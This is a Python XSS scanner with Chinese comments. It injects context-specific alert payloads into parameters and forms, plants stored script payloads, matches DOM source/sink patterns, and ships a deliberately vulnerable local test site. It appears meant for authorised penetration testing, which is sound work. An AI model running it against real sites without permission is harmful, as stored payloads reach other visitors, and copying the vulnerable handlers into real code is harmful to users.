#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XSS 三型检测模块 (零依赖, 纯标准库)
==================================
对目标 URL 自动检测 **反射型 / 存储型 / DOM 型** XSS, 输出可接 GUI 的结构化结果。

设计要点 (对应手工测试步骤):
    反射型  canary 探测回显 -> 判定注入上下文 -> 按上下文选 payload -> 验证是否原样输出
    存储型  表单逐字段埋唯一 payload -> 提交 -> 重访展示页 -> 原样回显即命中
    DOM 型  抓内联+外链 JS -> 正则找 source/sink -> 同文件共存判候选 -> 生成 PoC URL

用法:
    # 单 URL 全量扫描
    python xss_scan.py -u "https://target/search?q=test"

    # 带登录态 + 走 Burp 代理(便于对照 Repeater)
    python xss_scan.py -u "https://target/profile" -c "session=abc123" --proxy http://127.0.0.1:8080

    # 只跑某一型 (reflected / stored / dom)
    python xss_scan.py -u "https://target/" -m reflected,dom

    # 深度爬取 + JSON 输出 (接 PyQt5 GUI 表格)
    python xss_scan.py -u "https://target/" --depth 2 --max-pages 30 --json -o report.json

    # 本地自检 (无需网络, 自动起含三型漏洞的假站)
    python xss_scan.py --selftest

输出字段 (JSON):
    findings[].type       reflected | stored | dom
    findings[].severity   高 | 中 | 低
    findings[].context    html | attr | js | url_attr | comment   (反射型专有)
    findings[].poc        可直接粘贴浏览器的复现 URL
    findings[].evidence   响应中的证据片段

⚠️ 仅用于已获**书面授权**的渗透测试。默认并发为 1 且带延时, 避免打挂目标;
   扫描前确认授权范围与限流策略。本模块只做"响应侧"静态判定, 真实执行验证
   建议在 GUI 层用 QWebEngineView 加载 poc 挂钩 alert 二次确认。
"""
import argparse
import html
import json
import os
import random
import re
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser
from http.cookiejar import CookieJar

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

UA_LIST = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
]

# 探测用金丝雀: 高熵、不含 HTML 特殊字符, 保证只用于"是否回显"判断
CANARY = 'zXq7Kp2Ws9'

# 按注入上下文组织的 payload 表 (与手工逃逸表一一对应)
PAYLOADS = {
    'html':     ['<script>alert(1)</script>',
                 '<img src=x onerror=alert(1)>',
                 '<svg onload=alert(1)>'],
    'attr':     ['" onmouseover="alert(1)',
                 '"><svg onload=alert(1)>'],
    'js':       ["';alert(1);//",
                 '</script><script>alert(1)</script>'],
    'url_attr': ['javascript:alert(1)',
                 '" onfocus="alert(1)'],
    'comment':  ['--><script>alert(1)</script>',
                 '--><img src=x onerror=alert(1)>'],
}

SEVERITY_ORDER = {'高': 0, '中': 1, '低': 2}


# ==========================================================================
# HTTP 层
# ==========================================================================
def build_opener(proxy=None, no_verify=False):
    handlers = [urllib.request.HTTPCookieProcessor(CookieJar())]
    if proxy:
        handlers.append(urllib.request.ProxyHandler({'http': proxy, 'https': proxy}))
    if no_verify:
        handlers.append(urllib.request.HTTPSHandler(context=ssl._create_unverified_context()))
    return urllib.request.build_opener(*handlers)


def do_request(opener, url, data_bytes=None, headers=None, timeout=10, method=None):
    """发一次请求, 返回 (status, body_str, final_url)。异常返回 (0, '', url)。"""
    h = {'User-Agent': random.choice(UA_LIST)}
    if data_bytes is not None:
        h['Content-Type'] = 'application/x-www-form-urlencoded'
    if headers:
        h.update(headers)
    m = method or ('POST' if data_bytes is not None else 'GET')
    req = urllib.request.Request(url, data=data_bytes, headers=h, method=m)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode('utf-8', errors='replace'), resp.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='replace'), url
    except Exception:
        return 0, '', url


# ==========================================================================
# 页面解析: 抽链接 / 表单 / 内联与外链 JS
# ==========================================================================
class _PageParser(HTMLParser):
    def __init__(self, base_url):
        super().__init__()
        self.base = base_url
        self.links = []
        self.forms = []
        self.js_srcs = []
        self.inline_js = []
        self._form = None
        self._in_script = False

    def handle_starttag(self, tag, attrs):
        d = dict(attrs)
        if tag == 'a' and d.get('href'):
            u = urllib.parse.urljoin(self.base, d['href'])
            if u.startswith(('http://', 'https://')):
                self.links.append(u)
        elif tag == 'script':
            if d.get('src'):
                self.js_srcs.append(urllib.parse.urljoin(self.base, d['src']))
            else:
                self._in_script = True
        elif tag == 'form':
            self._form = {
                'action': urllib.parse.urljoin(self.base, d.get('action') or self.base),
                'method': (d.get('method') or 'GET').upper(),
                'inputs': [],
            }
        elif tag in ('input', 'textarea', 'select') and self._form is not None:
            name = d.get('name')
            if name:
                self._form['inputs'].append({
                    'name': name,
                    'type': (d.get('type') or 'text').lower(),
                    'value': d.get('value') or '',
                })

    def handle_endtag(self, tag):
        if tag == 'script':
            self._in_script = False
        elif tag == 'form' and self._form is not None:
            self.forms.append(self._form)
            self._form = None

    def handle_data(self, data):
        if self._in_script and data.strip():
            self.inline_js.append(data)


def parse_page(html_text, base_url):
    p = _PageParser(base_url)
    try:
        p.feed(html_text)
    except Exception:
        pass
    return {'links': p.links, 'forms': p.forms,
            'js_srcs': p.js_srcs, 'inline_js': p.inline_js}


# ==========================================================================
# 上下文判定: 决定 payload 怎么写 (核心)
# ==========================================================================
def classify_context(body, token):
    """判断 token 落在响应 HTML 的哪种上下文里。
    返回: html(标签之间) / attr(普通属性) / url_attr(href,src 等) /
          js(script 块内) / comment(注释内) / none(未回显)"""
    idx = body.find(token)
    if idx < 0:
        return 'none'
    head = body[:idx]
    # 1) 是否在 <script> 块内
    if head.rfind('<script') > head.rfind('</script'):
        return 'js'
    # 2) 是否在 <!-- --> 注释内
    if head.rfind('<!--') > head.rfind('-->'):
        return 'comment'
    # 3) 是否在某个标签内部 (最近的 < 在最近的 > 之后 => 处于标签中)
    lt, gt = head.rfind('<'), head.rfind('>')
    if lt > gt:
        tag = head[lt:]
        m = re.findall(r'([\w:-]+)\s*=\s*["\']?[^"\'\s]*$', tag)
        attr = (m[-1].lower() if m else '')
        if attr in ('href', 'src', 'action', 'formaction', 'data', 'xlink:href', 'background'):
            return 'url_attr'
        return 'attr'
    return 'html'


def check_reflection(body, payload):
    """判定 payload 在响应中的形态。
    raw=原样输出(可怀疑) / escaped=被实体编码 / stripped=被过滤掉标签 / none=未回显"""
    if payload in body:
        return 'raw'
    if html.escape(payload) in body or html.escape(payload, quote=False) in body:
        return 'escaped'
    core = re.sub(r'[<>"\'/=\s]', '', payload)
    if core and core in body:
        return 'stripped'
    return 'none'


def snippet(body, needle, width=90):
    i = body.find(needle)
    if i < 0:
        return ''
    return body[max(0, i - width // 2): i + len(needle) + width // 2].replace('\n', ' ')


# ==========================================================================
# 1) 反射型 XSS
# ==========================================================================
def test_reflected(base_url, opener, args, seen):
    """测 URL 查询参数 + GET 表单字段的反射型 XSS。"""
    findings = []
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query)

    # --- 1a. URL 查询参数 ---
    for name in qs:
        for payload_uid, value in [(CANARY, CANARY)]:
            q = {k: v[0] for k, v in qs.items()}
            q[name] = value
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(q)))
            status, body, _ = do_request(opener, test_url, headers=args.header,
                                         timeout=args.timeout)
            if status == 0 or CANARY not in body:
                continue  # 不回显 -> 换下一个参数, 省请求
            ctx = classify_context(body, CANARY)
            findings += _probe_payloads(opener, test_url, name, ctx, qs, parsed,
                                        args, 'reflected', seen, body)

    # --- 1b. GET 表单字段 (搜索框是重灾区) ---
    _, body0, _ = do_request(opener, base_url, headers=args.header, timeout=args.timeout)
    for form in parse_page(body0, base_url)['forms']:
        if form['method'] != 'GET' or not form['inputs']:
            continue
        for inp in form['inputs']:
            if inp['type'] in ('hidden', 'submit', 'button', 'image', 'reset'):
                continue
            data = {i['name']: (i['value'] or 'test') for i in form['inputs']}
            data[inp['name']] = CANARY
            test_url = form['action'] + '?' + urllib.parse.urlencode(data)
            status, body, _ = do_request(opener, test_url, headers=args.header,
                                         timeout=args.timeout)
            if status == 0 or CANARY not in body:
                continue
            ctx = classify_context(body, CANARY)
            fq = urllib.parse.parse_qs(urllib.parse.urlparse(test_url).query)
            findings += _probe_payloads(opener, test_url, inp['name'], ctx, fq,
                                        urllib.parse.urlparse(test_url), args,
                                        'reflected', seen, body)
    return findings


def _probe_payloads(opener, test_url, param, ctx, qs, parsed, args,
                    ftype, seen, probe_body):
    """按上下文逐个打 payload。

    去重策略 (避免"URL 参数分支"与"表单分支"对同一参数重复打两轮):
        (ftype, param, 'DONE') 已存在 -> 该参数已定论, 直接跳过
        命中 raw      -> 记 DONE, 停止该参数的后续 payload
        命中 escaped  -> 记 ESC, 只报一条低危, 同样停止 (编码是全量行为, 换 payload 无意义)
    """
    out = []
    done_key, esc_key = (ftype, param, 'DONE'), (ftype, param, 'ESC')
    if done_key in seen:
        return out
    for payload in PAYLOADS.get(ctx, PAYLOADS['html']):
        q = {k: v[0] for k, v in qs.items()}
        q[param] = payload
        poc = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(q)))
        key = (ftype, param, payload)
        if key in seen:
            continue
        seen.add(key)
        status, body, _ = do_request(opener, poc, headers=args.header, timeout=args.timeout)
        if status == 0:
            continue
        result = check_reflection(body, payload)
        if result == 'raw':
            seen.add(done_key)
            out.append({
                'type': ftype,
                'severity': '中' if ftype == 'reflected' else '高',
                'url': test_url,
                'param': param,
                'context': ctx,
                'payload': payload,
                'poc': poc,
                'evidence': snippet(body, payload),
                'note': 'payload 原样输出到响应, 需在浏览器确认是否执行',
            })
            break  # 一个参数定论即停, 不再穷举
        elif result == 'escaped':
            if esc_key not in seen:
                seen.add(esc_key)
                out.append({
                    'type': ftype, 'severity': '低', 'url': test_url, 'param': param,
                    'context': ctx, 'payload': payload, 'poc': poc,
                    'evidence': snippet(body, html.escape(payload)),
                    'note': '已实体编码, 判定安全 (记录备查)',
                })
            break  # 编码是全量行为, 换 payload 结果一致, 省请求
        time.sleep(args.delay)
    return out


# ==========================================================================
# 2) 存储型 XSS
# ==========================================================================
def test_stored(base_url, forms, display_urls, opener, args, seen):
    """表单逐字段埋唯一 payload -> 提交 -> 重访展示页复查。"""
    findings = []
    for form in forms[:args.max_forms]:
        text_fields = [i for i in form['inputs']
                       if i['type'] not in ('hidden', 'submit', 'button', 'image', 'reset')]
        if not text_fields:
            continue
        data, marks = {}, {}
        for i, inp in enumerate(form['inputs']):
            if inp['type'] in ('hidden', 'submit', 'button', 'image', 'reset'):
                data[inp['name']] = inp['value']
                continue
            uid = f'xsS{random.randint(100000, 999999)}'
            payload = f'<script>alert("{uid}")</script>'
            data[inp['name']] = payload
            marks[uid] = (inp['name'], payload)

        # --- 提交 ---
        if form['method'] == 'GET':
            submit_url = form['action'] + '?' + urllib.parse.urlencode(data)
            do_request(opener, submit_url, headers=args.header, timeout=args.timeout)
        else:
            do_request(opener, form['action'],
                       urllib.parse.urlencode(data).encode('utf-8'),
                       headers=args.header, timeout=args.timeout)
        time.sleep(args.delay)

        # --- 重访展示页复查 ---
        for durl in display_urls[:args.max_pages]:
            status, body, _ = do_request(opener, durl, headers=args.header,
                                         timeout=args.timeout)
            if status == 0:
                continue
            for uid, (fname, payload) in marks.items():
                result = check_reflection(body, payload)
                key = ('stored', fname, uid)
                if result == 'raw' and key not in seen:
                    seen.add(key)
                    findings.append({
                        'type': 'stored',
                        'severity': '高',
                        'url': durl,
                        'param': f'{fname} (表单 {form["method"]} -> {form["action"]})',
                        'context': 'html',
                        'payload': payload,
                        'poc': durl,
                        'evidence': snippet(body, payload),
                        'note': 'payload 持久化并原样输出, 所有访问者均会触发',
                    })
                elif result == 'escaped' and key not in seen:
                    seen.add(key)
                    findings.append({
                        'type': 'stored', 'severity': '低', 'url': durl,
                        'param': fname, 'context': 'html', 'payload': payload,
                        'poc': durl, 'evidence': snippet(body, html.escape(payload)),
                        'note': '已存储但输出时编码, 判定安全 (记录备查)',
                    })
    return findings


# ==========================================================================
# 3) DOM 型 XSS (静态污点分析: source -> sink)
# ==========================================================================
SOURCES = {
    'location.hash':     r'location\s*\.\s*hash',
    'location.search':   r'location\s*\.\s*search',
    'location.href':     r'location\s*\.\s*href|(?<!\.)\blocation\b(?!\s*\.)',
    'document.URL':      r'document\s*\.\s*(URL|documentURI)',
    'document.referrer': r'document\s*\.\s*referrer',
    'document.cookie':   r'document\s*\.\s*cookie',
    'window.name':       r'window\s*\.\s*name',
    'postMessage':       r'postMessage|addEventListener\(\s*[\'"]message',
    'storage':           r'(local|session)Storage',
}

SINKS = {
    'innerHTML':          r'\.innerHTML\s*=',
    'outerHTML':          r'\.outerHTML\s*=',
    'document.write':     r'document\s*\.\s*write(ln)?\s*\(',
    'insertAdjacentHTML': r'insertAdjacentHTML\s*\(',
    'eval':               r'(?<![\w.])eval\s*\(',
    'new Function':       r'new\s+Function\s*\(',
    'timer-string':       r'set(Timeout|Interval)\s*\(\s*[\'"`]',
    'jQuery.html':        r'\$\([^)]*\)\s*\.\s*(html|append|prepend|after|before)\s*\(',
    'jQuery.selector':    r'\$\(\s*(location|document\.URL|window\.location|[\'"]#)',
    'location.jump':      r'location\s*=\s*|location\s*\.\s*(assign|replace)\s*\(',
    'src.assign':         r'\.(src|href)\s*=',
    'setAttribute':       r'setAttribute\s*\(\s*[\'"](on\w+|href|src)',
}

# 高置信组合: hash/search/URL 这类典型 source 直连 DOM 写入 sink
HIGH_CONF_SOURCES = {'location.hash', 'location.search', 'document.URL', 'window.name'}
HIGH_CONF_SINKS = {'innerHTML', 'outerHTML', 'document.write', 'insertAdjacentHTML',
                   'jQuery.html', 'jQuery.selector'}


def collect_js(base_url, page, opener, args):
    """汇总内联 JS + 外链 JS 文本, 返回 [(来源名, 文本)]。"""
    blobs = [('inline', '\n'.join(page['inline_js']))]
    for src in page['js_srcs'][:args.max_js]:
        status, body, _ = do_request(opener, src, headers=args.header, timeout=args.timeout)
        if status and body:
            blobs.append((src, body[:args.max_js_size]))
        time.sleep(args.delay)
    return blobs


def test_dom(base_url, page, opener, args, seen):
    """静态分析 source/sink 共存情况, 输出候选点 + 可点击 PoC。"""
    findings = []
    for origin, text in collect_js(base_url, page, opener, args):
        if not text.strip():
            continue
        hit_src = [n for n, p in SOURCES.items() if re.search(p, text)]
        hit_sink = [n for n, p in SINKS.items() if re.search(p, text)]
        if not hit_src or not hit_sink:
            continue
        high = bool(set(hit_src) & HIGH_CONF_SOURCES) and bool(set(hit_sink) & HIGH_CONF_SINKS)
        key = ('dom', origin, tuple(sorted(hit_sink))[:3])
        if key in seen:
            continue
        seen.add(key)
        # 生成 PoC: hash 型最通用 (# 后不发给服务端, WAF 与日志都看不到)
        poc = base_url.split('#')[0] + '#' + urllib.parse.quote('<img src=x onerror=alert(1)>')
        ev = ''
        m = re.search(SOURCES[hit_src[0]], text)
        if m:
            i = m.start()
            ev = text[max(0, i - 60): i + 120].replace('\n', ' ')
        findings.append({
            'type': 'dom',
            'severity': '中' if high else '低',
            'url': base_url,
            'param': f'JS 来源: {origin}',
            'context': 'js',
            'payload': '<img src=x onerror=alert(1)>',
            'poc': poc,
            'evidence': ev,
            'note': ('source[%s] 与 sink[%s] 共存于同一脚本, 静态命中, '
                     '需浏览器/DOM Invader 复核污点是否真正连通'
                     % (','.join(hit_src[:3]), ','.join(hit_sink[:3]))),
        })
    return findings


# ==========================================================================
# 爬取
# ==========================================================================
def crawl(base_url, opener, args):
    """广度爬取同域页面, 收集 URL / 表单 / JS。返回 (pages, display_urls)。

    种子除起始 URL 外, 额外并入站点根路径: 起始 URL 常是深层路径 (如 /search?q=x),
    页面内未必有回首页的链接, 不补根种子就只能爬到孤零零一页。
    """
    pr = urllib.parse.urlparse(base_url)
    host = pr.netloc
    root = f'{pr.scheme}://{host}/'
    seeds = [base_url] + ([root] if root != base_url else [])
    seen, queue, pages, displays = set(seeds), list(seeds), [], list(seeds)
    depth = {u: 0 for u in seeds}
    while queue and len(seen) <= args.max_pages:
        url = queue.pop(0)
        status, body, _ = do_request(opener, url, headers=args.header, timeout=args.timeout)
        if status == 0 or not body:
            continue
        page = parse_page(body, url)
        pages.append((url, page))
        displays.append(url)
        if depth.get(url, 0) >= args.depth:
            continue
        for link in page['links']:
            clean = link.split('#')[0]
            if clean not in seen and urllib.parse.urlparse(clean).netloc == host:
                seen.add(clean)
                depth[clean] = depth.get(url, 0) + 1
                queue.append(clean)
        time.sleep(args.delay)
    return pages, displays


# ==========================================================================
# 汇总报告
# ==========================================================================
def scan(base_url, args):
    opener = build_opener(args.proxy, args.no_verify)
    headers = {}
    if args.cookie:
        headers['Cookie'] = args.cookie
    args.header = headers

    findings, seen = [], set()
    pages, displays = crawl(base_url, opener, args)
    all_forms = [f for _, p in pages for f in p['forms']]

    if 'reflected' in args.modes:
        for url, _ in pages[:args.max_pages]:
            findings += test_reflected(url, opener, args, seen)
    if 'stored' in args.modes:
        findings += test_stored(base_url, all_forms, displays, opener, args, seen)
    if 'dom' in args.modes:
        for url, page in pages[:args.max_pages]:
            findings += test_dom(url, page, opener, args, seen)

    findings.sort(key=lambda f: (SEVERITY_ORDER.get(f['severity'], 9), f['type']))
    summary = {'高': 0, '中': 0, '低': 0}
    for f in findings:
        summary[f['severity']] = summary.get(f['severity'], 0) + 1
    return {'target': base_url,
            'scanned_pages': len(pages),
            'summary': summary,
            'findings': findings}


def print_report(rep):
    s = rep['summary']
    print(f"\n[=] 扫描完成: 页面 {rep['scanned_pages']} 个, "
          f"高 {s.get('高', 0)} / 中 {s.get('中', 0)} / 低 {s.get('低', 0)}")
    if not rep['findings']:
        print("[-] 未发现 XSS 疑似点")
        return
    print()
    for f in rep['findings']:
        mark = {'高': '[!]', '中': '[+]', '低': '[.]'}.get(f['severity'], '[.]')
        print(f"{mark} {f['severity']}危  {f['type']:9s} {f['url']}")
        print(f"     参数  : {f['param']}")
        print(f"     上下文: {f['context']}")
        print(f"     载荷  : {f['payload']}")
        print(f"     PoC   : {f['poc']}")
        if f['evidence']:
            print(f"     证据  : …{f['evidence'][:100]}…")
        print(f"     说明  : {f['note']}")
        print()


# ==========================================================================
# 自检: 本地起一个含三型漏洞的假站, 端到端验证
# ==========================================================================
def selftest():
    import http.server

    COMMENTS = []

    class VulnSite(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _send(self, body, code=200):
            b = body.encode('utf-8')
            self.send_response(code)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(b)))
            self.end_headers()
            self.wfile.write(b)

        def do_GET(self):
            p = urllib.parse.urlparse(self.path)
            q = urllib.parse.parse_qs(p.query)
            if p.path == '/reflect':                       # 反射型: 原样回显
                v = q.get('q', [''])[0]
                self._send(f'<html><body><div>result: {v}</div></body></html>')
            elif p.path == '/safe':                        # 反射型: 已编码(应判安全)
                v = html.escape(q.get('q', [''])[0])
                self._send(f'<html><body><div>result: {v}</div></body></html>')
            elif p.path == '/store':                       # 存储型: 表单页
                self._send('<html><body>'
                           '<form method="POST" action="/post">'
                           '<input name="comment"><input type="submit">'
                           '</form></body></html>')
            elif p.path == '/comments':                    # 存储型: 展示页(原样输出)
                body = ''.join(f'<div class="c">{c}</div>' for c in COMMENTS)
                self._send(f'<html><body><a href="/store">back</a>{body}</body></html>')
            elif p.path == '/dom':                         # DOM 型: hash -> innerHTML
                self._send('<html><body><div id="out"></div>'
                           '<script>var h = location.hash.slice(1);'
                           'document.getElementById("out").innerHTML = h;</script>'
                           '</body></html>')
            else:
                self._send('404', 404)

        def do_POST(self):
            ln = int(self.headers.get('Content-Length', 0) or 0)
            qs = urllib.parse.parse_qs(self.rfile.read(ln).decode('utf-8', errors='replace'))
            COMMENTS.append(qs.get('comment', [''])[0])
            self._send('<html><body>ok <a href="/comments">view</a></body></html>')

    srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), VulnSite)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    base = f'http://127.0.0.1:{port}'

    class A:
        pass
    a = A()
    a.cookie, a.proxy, a.header, a.timeout = None, None, {}, 5
    a.delay, a.depth, a.max_pages = 0.0, 1, 10
    a.max_forms, a.max_js, a.max_js_size = 5, 10, 300000
    a.modes = ['reflected', 'stored', 'dom']
    a.no_verify = False

    opener = build_opener()
    checks, seen = [], set()

    # 1) 反射型: 有漏洞的应命中, 已编码的应判低危(安全)
    f1 = test_reflected(f'{base}/reflect?q=test', opener, a, seen)
    checks.append(('反射型-有漏洞应命中',
                   any(f['type'] == 'reflected' and f['severity'] == '中' for f in f1)))
    f2 = test_reflected(f'{base}/safe?q=test', opener, a, seen)
    checks.append(('反射型-已编码应判安全',
                   not any(f['severity'] == '中' for f in f2)))

    # 2) 存储型: 提交后展示页应原样回显
    _, body0, _ = do_request(opener, f'{base}/store', timeout=5)
    forms = parse_page(body0, f'{base}/store')['forms']
    f3 = test_stored(f'{base}/store', forms, [f'{base}/comments'], opener, a, seen)
    checks.append(('存储型-展示页应命中',
                   any(f['type'] == 'stored' and f['severity'] == '高' for f in f3)))

    # 3) DOM 型: 应识别 location.hash -> innerHTML
    _, body1, _ = do_request(opener, f'{base}/dom', timeout=5)
    page = parse_page(body1, f'{base}/dom')
    f4 = test_dom(f'{base}/dom', page, opener, a, seen)
    checks.append(('DOM型-source/sink 应命中',
                   any(f['type'] == 'dom' and f['severity'] == '中' for f in f4)))

    srv.shutdown()
    print('[=] XSS 三型自检:')
    ok = True
    for name, passed in checks:
        print(f"    [{'PASS' if passed else 'FAIL'}] {name}")
        ok &= passed
    print(f"[{'PASS' if ok else 'FAIL'}] 自检{'通过' if ok else '失败'}")
    sys.exit(0 if ok else 1)


# ==========================================================================
def parse_args(argv):
    ap = argparse.ArgumentParser(
        prog='xss-scan',
        description='XSS 三型检测模块 (反射/存储/DOM, 零依赖纯标准库)',
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument('--selftest', action='store_true', help='本地自检 (无需网络)')
    ap.add_argument('-u', '--url', help='目标 URL (含查询参数效果最佳)')
    ap.add_argument('-m', '--modes', default='reflected,stored,dom',
                    help='检测类型, 逗号分隔 (默认全跑)')
    ap.add_argument('-c', '--cookie', help='鉴权 Cookie, 如 "session=xxx" (测后台存储型必备)')
    ap.add_argument('--proxy', help='HTTP(S) 代理, 如 http://127.0.0.1:8080 (接 Burp)')
    ap.add_argument('--depth', type=int, default=1, help='爬取深度 (默认 1)')
    ap.add_argument('--max-pages', type=int, default=15, help='最大爬取页数 (默认 15)')
    ap.add_argument('--max-forms', type=int, default=5, help='最大测试表单数 (默认 5)')
    ap.add_argument('--max-js', type=int, default=20, help='最大抓取外链 JS 数 (默认 20)')
    ap.add_argument('--max-js-size', type=int, default=500000, help='单个 JS 读取上限字节')
    ap.add_argument('--delay', type=float, default=0.1, help='每请求延时秒数 (防限流, 默认 0.1)')
    ap.add_argument('--timeout', type=float, default=10.0, help='请求超时秒数 (默认 10)')
    ap.add_argument('--no-verify', action='store_true', help='跳过 TLS 证书校验')
    ap.add_argument('--json', action='store_true', help='JSON 格式输出')
    ap.add_argument('-o', '--output', help='结果写入文件 (配合 --json 使用)')
    return ap.parse_args(argv)


def main():
    args = parse_args(sys.argv[1:])
    if args.selftest:
        selftest()
        return
    if not args.url:
        sys.exit('[-] 需要 -u/--url 目标, 或用 --selftest 自检')
    args.modes = [m.strip() for m in args.modes.split(',') if m.strip()]
    print(f"[*] 目标: {args.url}")
    print(f"[*] 模式: {','.join(args.modes)}  深度={args.depth}  最大页数={args.max_pages}")
    try:
        rep = scan(args.url, args)
    except KeyboardInterrupt:
        print('\n[!] 手动中断')
        return
    if args.json:
        text = json.dumps(rep, ensure_ascii=False, indent=1)
        print(text)
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write(text)
            print(f"[+] 已写入 {os.path.abspath(args.output)}")
    else:
        print_report(rep)


if __name__ == '__main__':
    main()
